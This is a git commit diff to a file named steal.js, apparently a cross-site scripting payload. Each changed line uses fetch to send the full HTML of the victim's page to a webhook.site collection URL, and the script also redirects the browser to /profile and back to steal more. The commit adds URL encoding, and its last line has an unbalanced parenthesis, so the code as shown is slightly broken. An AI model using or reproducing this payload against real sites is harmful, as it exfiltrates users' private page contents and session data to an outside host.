fa57dec72ac62c19e9b7b80a83c3f02062fcf5d5
Dan1e1B <147431777+Dan1e1B@users.noreply.github.com>
2025-12-28 14:17:38 +0000

    Encode HTML before sending fetch requests

--- steal.js
+++ steal.js
@@ -1,6 +1,6 @@
 // 1. Navigate to profile
-fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + document.documentElement.outerHTML);
+fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + encodeURIComponent(document.documentElement.outerHTML));
 window.location = "/profile";
-fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + document.documentElement.outerHTML);
+fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + encodeURIComponent(document.documentElement.outerHTML));
 window.location = "/";
-fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=");
+fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + encodeURIComponent(document.documentElement.outerHTML);
